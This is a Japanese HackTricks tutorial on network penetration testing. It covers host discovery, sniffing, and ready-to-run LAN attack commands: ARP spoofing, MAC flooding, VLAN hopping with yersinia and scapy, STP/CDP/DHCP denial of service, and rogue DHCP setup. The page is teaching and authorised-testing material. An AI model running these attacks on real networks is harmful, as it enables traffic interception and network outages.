# ネットワークの侵入テスト

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）でAWSハッキングをゼロからヒーローまで学びましょう</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)をフォローする
- **HackTricks**と**HackTricks Cloud**のGitHubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**バグバウンティのヒント**: **ハッカーによって作成されたプレミアムバグバウンティプラットフォーム**である**Intigriti**に**サインアップ**してください！今すぐ[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大**$100,000**のバウンティを獲得しましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

## 外部からホストを発見する

これは、**インターネットから応答するIPを見つける方法**についての**簡単なセクション**になります。\
この状況では、いくつかの**IPのスコープ**（おそらく複数の**範囲**さえも）があり、**どのIPが応答しているか**を見つけるだけです。

### ICMP

これは、ホストが起動しているかどうかを発見する**最も簡単で速い方法**です。\
いくつかの**ICMP**パケットを送信して**応答を期待**することができます。最も簡単な方法は、**エコーリクエスト**を送信して応答を期待することです。これは、単純な`ping`を使用するか、**範囲**に対して`fping`を使用することで行うことができます。\
また、**nmap**を使用して他のタイプのICMPパケットを送信することもできます（これにより、一般的なICMPエコーリクエスト-レスポンスへのフィルタが回避されます）。
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP ポートの発見

すべての種類の ICMP パケットがフィルタリングされていることが非常に一般的です。そのため、ホストが稼働しているかどうかを確認するためにできることは、**オープンなポートを見つけようとすること**です。各ホストには**65535個のポート**がありますので、もし「大規模」なスコープを持っている場合、各ホストの**すべてのポート**がオープンかどうかをテストすることはできません。それには時間がかかりすぎます。\
そのため、必要なものは**高速なポートスキャナー**（[masscan](https://github.com/robertdavidgraham/masscan)）と**よく使用されるポートのリスト**です：
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
### HTTP ポートの発見

これは、**HTTP サービスの発見に焦点を当てたいときに便利な** TCP ポートの発見です。
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDPポートの発見

また、ホストに**より注意を払うべきかどうか**を判断するために、**UDPポートが開いているかどうか**をチェックすることもできます。通常、UDPサービスは**通常の空のUDPプローブパケットに対して** **データを返さない**ため、ポートがフィルタリングされているか開いているかを判断するのは難しいです。これを判断する最も簡単な方法は、実行中のサービスに関連するパケットを送信することであり、実行中のサービスがわからないため、ポート番号に基づいて最もありそうなものを試す必要があります。
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
前に提案されたnmapの行は、/24の範囲内のすべてのホストで**トップ1000のUDPポート**をテストしますが、これだけでも**20分以上**かかります。 より**高速な結果**が必要な場合は、[**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner)を使用できます：`./udp-proto-scanner.pl 199.66.11.53/24` これにより、これらの**UDPプローブ**がそれらの**期待されるポート**に送信されます（/24の範囲では1分で完了します）：_DNSStatusRequest、DNSVersionBindReq、NBTStat、NTPRequest、RPCCheck、SNMPv3GetRequest、chargen、citrix、daytime、db2、echo、gtpv1、ike、ms-sql、ms-sql-slam、netop、ntp、rpc、snmp-public、systat、tftp、time、xdmcp._

### SCTPポートの発見
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Wifiのペンテスト

ここでは、執筆時点でよく知られているWifi攻撃の素敵なガイドを見つけることができます:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## 内部からホストを発見する

ネットワーク内部にいる場合、最初に行いたいことの1つは**他のホストを発見する**ことです。**どれだけノイズ**を出すことができるか/したいかによって、異なるアクションを実行できます:

### パッシブ

これらのツールを使用して、接続されたネットワーク内のホストを受動的に発見できます:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Active

[_**外部からホストを発見する**_](./#discovering-hosts-from-the-outside)（_TCP/HTTP/UDP/SCTP ポート探索_）でコメントされている技術に注意してください。\
しかし、他のホストと**同じネットワーク**にいるため、**ここでは**さらに多くのことができます：
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

_外部からホストを発見する_ でコメントされている技術（[_**ICMP**_](./#icmp)）は、ここでも**適用できます**。\
ただし、他のホストと**同じネットワーク**にいるため、**さらに多くのこと**ができます：

- **サブネットブロードキャストアドレス**に**ping**を送信すると、各ホストにpingが到達し、彼らが**あなたに応答**する可能性があります： `ping -b 10.10.5.255`
- **ネットワークブロードキャストアドレス**にpingを送信すると、**他のサブネット内のホスト**を見つけることさえできます： `ping -b 255.255.255.255`
- `nmap`の`-PE`、`-PP`、`-PM`フラグを使用して、それぞれ**ICMPv4 echo**、**タイムスタンプ**、**サブネットマスクリクエスト**を送信してホストの検出を実行します： `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lanは、**ネットワークメッセージ**を介してコンピューターを**起動**するために使用されます。コンピューターを起動するために使用されるマジックパケットは、MAC Dstが提供され、その後、同じパケット内で**16回繰り返される**パケットです。\
その後、この種のパケットは通常、**イーサネット0x0842**または**ポート9へのUDPパケット**で送信されます。\
**\[MAC]**が提供されない場合、パケットは**ブロードキャストイーサネット**に送信されます（ブロードキャストMACが繰り返されるものになります）。
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## ホストのスキャン

IPアドレス（外部または内部）をすべて発見したら、詳細にスキャンしたいと思うでしょう。異なるアクションを実行できます。

### TCP

* **オープン**ポート： _SYN --> SYN/ACK --> RST_
* **クローズド**ポート： _SYN --> RST/ACK_
* **フィルタリングされた**ポート： _SYN --> \[NO RESPONSE]_
* **フィルタリングされた**ポート： _SYN --> ICMPメッセージ_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

UDPポートをスキャンするための2つのオプションがあります：

- ポートが**閉じている**場合は、**UDPパケット**を送信して応答が **ICMP unreachable** かどうかを確認します（いくつかのケースでは、ICMPが**フィルタリング**されているため、ポートが閉じているか開いているかの情報を受信できないことがあります）。
- **フォーマットされたデータグラム**を送信して、**サービス**（例：DNS、DHCP、TFTPなど、_nmap-payloads_にリストされている他のサービス）から応答を引き出します。応答を受信した場合は、ポートが**開いている**ことになります。

**Nmap**は"-sV"を使用して**両方の**オプションを組み合わせます（UDPスキャンは非常に遅いです）、ただし、UDPスキャンはTCPスキャンよりも遅いことに注意してください：
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTPスキャン

**SCTP（Stream Control Transmission Protocol）**は、**TCP（Transmission Control Protocol）**および**UDP（User Datagram Protocol）**と併用するように設計されています。その主な目的は、IPネットワーク上での電話データの輸送を容易にし、**Signaling System 7（SS7）**で見られる信頼性の多くの機能を反映しています。**SCTP**は、**SIGTRAN**プロトコルファミリーの中核コンポーネントであり、SS7信号をIPネットワーク上で輸送することを目的としています。

**SCTP**のサポートは、**IBM AIX**、**Oracle Solaris**、**HP-UX**、**Linux**、**Cisco IOS**、**VxWorks**など、さまざまなオペレーティングシステムによって提供されており、その広範な受容と通信およびネットワーキング分野での有用性が示されています。

nmapによって提供されるSCTPの2つの異なるスキャンオプション: _-sY_ および _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDSおよびIPS回避

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **さらなるnmapオプション**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### 内部IPアドレスの特定

**設定ミスのルーター、ファイアウォール、およびネットワークデバイス** は、時々 **非公開ソースアドレス** を使用してネットワークプローブに応答します。**tcpdump** を使用して、テスト中にプライベートアドレスから受信したパケットを特定できます。具体的には、Kali Linuxでは、**eth2インターフェース** でパケットをキャプチャできます。これは公共インターネットからアクセスできます。設定がNATまたはファイアウォールの背後にある場合、そのようなパケットはフィルタリングされる可能性があることに注意することが重要です。
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## スニッフィング

スニッフィングを行うと、キャプチャされたフレームやパケットを確認することで、IPレンジ、サブネットサイズ、MACアドレス、ホスト名の詳細を把握できます。ネットワークが誤って構成されているか、スイッチングファブリックがストレス下にある場合、攻撃者は受動的なネットワークスニッフィングを通じて機密情報をキャプチャすることができます。

スイッチングされたイーサネットネットワークが適切に構成されている場合、ブロードキャストフレームとMACアドレス宛に送信されたデータのみが表示されます。

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
一方、WiresharkをGUIとして使用してリアルタイムでリモートマシンからSSHセッション経由でパケットをキャプチャすることもできます。
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

当然。

### 資格情報のキャプチャ

[https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) のようなツールを使用して、pcap またはライブインターフェースから資格情報を解析できます。

## LAN 攻撃

### ARP スプーフィング

ARP スプーフィングは、不正な ARP レスポンスを送信して、特定のマシンの IP が自分のデバイスの MAC アドレスであることを示すことです。その後、被害者は ARP テーブルを変更し、スプーフィングされた IP に接続するたびに、当該 IP に接続するために当社のマシンに連絡します。

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAMオーバーフロー

異なるソースMACアドレスを持つ多くのパケットを送信して、スイッチのCAMテーブルをオーバーフローさせます。CAMテーブルがいっぱいになると、スイッチはハブのように振る舞い始めます（すべてのトラフィックをブロードキャストします）。
```bash
macof -i <interface>
```
### 802.1Q VLAN / DTP Attacks

#### Dynamic Trunking

**動的トランクプロトコル（DTP）**は、トランクモード（トランク）または非トランクモードのポートをスイッチが自動的に選択できるようにするリンク層プロトコルとして設計されています。**DTP**の展開は、サブオプティマルなネットワーク設計の兆候と見なされることがよくあり、必要な場所だけでトランクを手動で構成し、適切なドキュメントを確認することの重要性を強調しています。

デフォルトでは、スイッチポートは動的オートモードで動作するように設定されており、隣接するスイッチに促されるとトランクを開始できる状態です。ペンテスターまたは攻撃者がスイッチに接続し、DTPデザイアブルフレームを送信すると、ポートがトランクモードに入るため、セキュリティ上の懸念が生じます。この行動により、攻撃者はSTPフレームの解析を通じてVLANを列挙し、仮想インターフェースを設定することでVLANセグメンテーションを回避できます。

多くのスイッチにデフォルトでDTPが存在することを悪用することで、敵対者はスイッチの振る舞いを模倣し、結果としてすべてのVLANを通過するトラフィックにアクセスできます。スクリプト[_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan)は、インターフェースを監視し、スイッチがデフォルト、トランク、ダイナミック、オート、またはアクセスモードのいずれであるかを明らかにし、VLANホッピング攻撃に対して免疫力のある唯一の構成である後者を評価するために使用されます。このツールはスイッチの脆弱性ステータスを評価します。

ネットワークの脆弱性が特定された場合、_**Yersinia**_ツールを使用してDTPプロトコルを介して「トランクを有効に」し、すべてのVLANからパケットを観察できます。
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (269).png>)

VLANを列挙するためには、スクリプト[DTPHijacking.py](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)を使用してDTPデザイアブルフレームを生成することも可能です。スクリプトを絶対に中断しないでください。それは3秒ごとにDTPデザイアブルをインジェクトします。スイッチ上で動的に作成されたトランクチャネルは、5分間だけ存在します。5分後にトランクは切断されます。
```
sudo python3 DTPHijacking.py --interface eth0
```
私たちは、**Access/Desirable (0x03)** がDTPフレームがDesirableタイプであることを示し、ポートにTrunkモードへの切り替えを指示することを示すことを指摘したいと思います。そして、**802.1Q/802.1Q (0xa5)** は **802.1Q** カプセル化タイプを示します。

STPフレームを分析することで、**VLAN 30とVLAN 60の存在について知ることができます。**

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

#### 特定のVLANへの攻撃

VLANのIDとIP値を知ったら、**特定のVLANを攻撃するために仮想インターフェースを設定**できます。\
DHCPが利用できない場合は、静的IPアドレスを設定するために _ifconfig_ を使用してください。
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### 自動VLANホッパー

**ダイナミックトランキングと仮想インターフェースの作成、他のVLAN内のホストの発見**という攻撃は、[**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)というツールによって**自動的に実行**されます。

#### ダブルタギング

攻撃者が**被害者ホストのMAC、IP、VLAN IDの値を知っている**場合、指定されたVLANと被害者のVLANで**フレームにダブルタグを付け**、パケットを送信することができます。**被害者は攻撃者に接続できない**ため、**攻撃者の最良の選択肢はUDPを介して通信する**ことです。興味深いアクションを実行できるプロトコル（SNMPなど）。

攻撃者の別の選択肢は、**攻撃者が制御するIPをスプーフィングし、被害者がアクセス可能なTCPポートスキャンを実行**することです（おそらくインターネット経由）。その後、攻撃者は、被害者からパケットを受信するかどうかを自分が所有する2番目のホストでスニッフィングできます。

![](<../../.gitbook/assets/image (190).png>)

この攻撃を実行するには、scapyを使用できます：`pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### レイテラルVLANセグメンテーションバイパス <a href="#d679" id="d679"></a>

もし直接接続されたスイッチに**アクセス権**がある場合、ネットワーク内での**VLANセグメンテーションをバイパス**する能力があります。単純にポートをトランクモード（トランクとも呼ばれる）に切り替え、ターゲットVLANのIDを持つ仮想インターフェースを作成し、IPアドレスを設定します。アドレスを動的に（DHCP）要求するか、静的に設定するかはケースによります。

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### レイヤー3 プライベートVLAN バイパス

特定の環境、例えばゲストワイヤレスネットワークでは、**ポートアイソレーション（プライベートVLANとも呼ばれる）**設定が実装され、ワイヤレスアクセスポイントに接続されたクライアント同士の直接通信を防いでいます。しかし、これらの分離対策を回避する技術が特定されています。この技術は、ネットワークACLの欠如または不適切な構成を悪用し、IPパケットがルーターを経由して同じネットワーク上の別のクライアントに到達するようにします。

攻撃は、**宛先クライアントのIPアドレスを持つパケットを作成し、ルーターのMACアドレスを使用**することで実行されます。これにより、ルーターは誤ってパケットをターゲットクライアントに転送します。このアプローチは、被害者にアクセス可能なホストを制御することでセキュリティ上の欠陥を悪用するダブルタギング攻撃で使用されるものと似ています。

**攻撃の主なステップ:**

1. **パケットの作成:** ターゲットクライアントのIPアドレスを含むように特別に作成されたパケット。
2. **ルーターの動作の悪用:** 作成されたパケットがルーターに送信され、構成により、プライベートVLAN設定によって提供される分離をバイパスして、パケットがターゲットクライアントに転送されます。

### VTP攻撃

VTP（VLANトランキングプロトコル）はVLAN管理を集約化します。リビジョン番号を使用してVLANデータベースの整合性を維持し、変更があるとこの番号が増加します。スイッチは、より高いリビジョン番号の構成を採用し、独自のVLANデータベースを更新します。

#### VTPドメインの役割

* **VTPサーバー:** VLANを管理し、作成、削除、変更を行います。ドメインメンバーにVTPアナウンスをブロードキャストします。
* **VTPクライアント:** VTPアナウンスを受信してVLANデータベースを同期します。この役割は、ローカルVLAN構成の変更を制限されています。
* **VTPトランスペアレント:** VTPの更新には参加せず、VTPアナウンスを転送します。VTP攻撃の影響を受けず、リビジョン番号は常にゼロのままです。

#### VTP広告タイプ

* **サマリ広告:** VTPサーバーによって300秒ごとにブロードキャストされ、重要なドメイン情報を運びます。
* **サブセット広告:** VLAN構成の変更後に送信されます。
* **広告リクエスト:** VTPクライアントがサマリ広告を要求するために発行され、通常はより高い構成リビジョン番号を検出した場合に応答します。

VTPの脆弱性はトランクポートを介してのみ悪用可能です。VTPアナウンスはこれらのポートを通じてのみ循環します。DTP攻撃シナリオはVTPに向かう可能性があります。YersiniaのようなツールはVTP攻撃を容易にし、VLANデータベースを消去し、ネットワークを効果的に混乱させることを目指します。

注意: この議論はVTPバージョン1（VTPv1）に関連しています。
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
### STP攻撃

**インターフェースでBPDUフレームをキャプチャできない場合、STP攻撃を成功させる可能性は低いです。**

#### **STP BPDU DoS**

多くのBPDUs TCP（Topology Change Notification）またはConf（トポロジが作成されたときに送信されるBPDUs）を送信すると、スイッチが過負荷となり正常に動作しなくなります。
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

TCPを送信すると、スイッチのCAMテーブルが15秒で削除されます。その後、この種のパケットを連続して送信していると、CAMテーブルが連続して再起動されます（または15秒ごとに）し、再起動されると、スイッチはハブのように動作します
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

攻撃者は、スイッチの振る舞いをシミュレートしてネットワークのSTPルートになります。その後、より多くのデータが彼を通過します。これは、2つの異なるスイッチに接続されている場合に興味深いです。\
これは、**優先度**値が実際のルートスイッチの優先度よりも低いということを示すBPDUs CONFパケットを送信することで行われます。
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**攻撃者が2つのスイッチに接続されている場合、彼は新しいツリーのルートとなり、それらのスイッチ間のすべてのトラフィックが彼を経由することになります**（MITM攻撃が実行されます）。
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP 攻撃

CISCO Discovery Protocol（CDP）は、CISCO デバイス間の通信に不可欠であり、**お互いを識別し構成の詳細を共有**することができます。

#### パッシブデータ収集 <a href="#id-0e0f" id="id-0e0f"></a>

CDP はすべてのポートを介して情報をブロードキャストするように構成されており、これはセキュリティリスクにつながる可能性があります。攻撃者は、スイッチポートに接続した際に、**Wireshark**、**tcpdump**、または**Yersinia**などのネットワークスニッファを展開することができます。この行動により、ネットワークデバイスに関する機密データが公開され、そのモデルや実行されているCisco IOSのバージョンなどが明らかになります。攻撃者は、特定の脆弱性を特定されたCisco IOSバージョンに対して標的にするかもしれません。

#### CDP テーブルフラッディングの誘発 <a href="#id-0d6a" id="id-0d6a"></a>

より攻撃的なアプローチは、合法的なCISCOデバイスであるかのように振る舞い、スイッチのメモリを圧倒してサービスの拒否（DoS）攻撃を開始することです。以下は、テスト用に設計されたネットワークツールであるYersiniaを使用してこのような攻撃を開始するためのコマンドシーケンスです：
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
攻撃中、スイッチのCPUとCDP隣接テーブルが重く負担され、しばしば**「ネットワーク麻痺」**と呼ばれる状況が生じます。これは、過剰なリソース消費によるものです。

#### CDPなりすまし攻撃
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
また、[**scapy**](https://github.com/secdev/scapy/)を使用することもできます。`scapy/contrib`パッケージを使用してインストールしてください。

### VoIP攻撃とVoIP Hopperツール

VoIP電話は、IoTデバイスと統合されることが増えており、特別な電話番号を介してドアの開錠や温度調節などの機能を提供しています。ただし、この統合はセキュリティリスクを引き起こす可能性があります。

ツール[**voiphopper**](http://voiphopper.sourceforge.net)は、さまざまな環境（Cisco、Avaya、Nortel、Alcatel-Lucent）でVoIP電話をエミュレートするよう設計されています。CDP、DHCP、LLDP-MED、および802.1Q ARPなどのプロトコルを使用して音声ネットワークのVLAN IDを発見します。

**VoIP Hopper**には、Cisco Discovery Protocol（CDP）用の3つのモードがあります：

1. **スニッフモード**（`-c 0`）：ネットワークパケットを分析してVLAN IDを特定します。
2. **スプーフモード**（`-c 1`）：実際のVoIPデバイスのパケットを模倣するカスタムパケットを生成します。
3. **事前作成パケットモードでスプーフ**（`-c 2`）：特定のCisco IP電話モデルのパケットと同一のパケットを送信します。

速度を重視する場合、3番目のモードが好ましいです。指定する必要があるものは次のとおりです：

* 攻撃者のネットワークインターフェース（`-i`パラメータ）。
* エミュレートされるVoIPデバイスの名前（`-E`パラメータ）、Ciscoの命名形式に従う必要があります（例：MACアドレスに続くSEP）。

企業環境では、既存のVoIPデバイスを模倣するために、次のことが考えられます：

* 電話機のMACラベルを調査する。
* モデル情報を表示するために電話機のディスプレイ設定をナビゲートする。
* VoIPデバイスをノートパソコンに接続し、Wiresharkを使用してCDPリクエストを観察する。

3番目のモードでツールを実行するための例示的なコマンドは次のとおりです：
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP攻撃

#### 列挙
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

DHCPサーバーに対して実行できる**DoSの2種類**があります。最初の方法は、**十分な偽のホストをシミュレートして、可能なすべてのIPアドレスを使用する**ことです。\
この攻撃は、DHCPサーバーの応答を見ることができ、プロトコルを完了できる場合にのみ機能します（**Discover**（コンピュータ）--> **Offer**（サーバー）--> **Request**（コンピュータ）--> **ACK**（サーバー））。たとえば、これは**Wifiネットワークでは不可能**です。

DHCP DoSを実行する別の方法は、**すべての可能なIPをソースコードとして使用してDHCP-RELEASEパケットを送信**することです。その後、サーバーは誰もがIPを使用し終わったと思うでしょう。
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
より自動的な方法は、[DHCPing](https://github.com/kamorin/DHCPig)ツールを使用することです。

環境内でクライアントに新しいリースを取得させるために、上記のDoS攻撃を使用して、正規のサーバーを使い果たし、応答しなくなるようにすることができます。したがって、正規のサーバーが再接続しようとすると、**次の攻撃で言及されている悪意のある値を提供できます**。

#### 悪意のある値を設定する

`/usr/share/responder/DHCP.py`にあるDHCPスクリプトを使用して、ローグDHCPサーバーを設定できます。これは、HTTPトラフィックや資格情報をキャプチャするなどのネットワーク攻撃に役立ちます。ただし、ローグゲートウェイを設定すると、クライアントからのアウトバウンドトラフィックのキャプチャのみが可能であり、実際のゲートウェイからの応答を見逃すため、効果が低下します。代わりに、ローグDNSサーバーやWPADサーバーを設定することをお勧めします。

以下は、ローグDHCPサーバーを構成するためのコマンドオプションです：

* **当社のIPアドレス（ゲートウェイ広告）**：`-i 10.0.0.100`を使用して、自分のマシンのIPをゲートウェイとして広告します。
* **ローカルDNSドメイン名**：オプションで、`-d example.org`を使用してローカルDNSドメイン名を設定できます。
* **元のルーター/ゲートウェイIP**：正規のルーターやゲートウェイのIPアドレスを指定するには、`-r 10.0.0.1`を使用します。
* **プライマリDNSサーバーIP**：コントロールするローグDNSサーバーのIPアドレスを設定するには、`-p 10.0.0.100`を使用します。
* **セカンダリDNSサーバーIP**：オプションで、セカンダリDNSサーバーのIPを設定するには、`-s 10.0.0.1`を使用します。
* **ローカルネットワークのネットマスク**：ローカルネットワークのネットマスクを定義するには、`-n 255.255.255.0`を使用します。
* **DHCPトラフィック用のインターフェース**：特定のネットワークインターフェースでDHCPトラフィックをリッスンするには、`-I eth1`を使用します。
* **WPAD構成アドレス**：Webトラフィックの傍受を支援するために、`-w “http://10.0.0.100/wpad.dat”`を使用してWPAD構成のアドレスを設定します。
* **デフォルトゲートウェイIPのスプーフィング**：デフォルトゲートウェイIPアドレスをスプーフィングするには、`-S`を含めます。
* **すべてのDHCPリクエストに応答する**：サーバーがすべてのDHCPリクエストに応答するようにするには、`-R`を含めますが、これはノイズが多く、検出される可能性があることに注意してください。

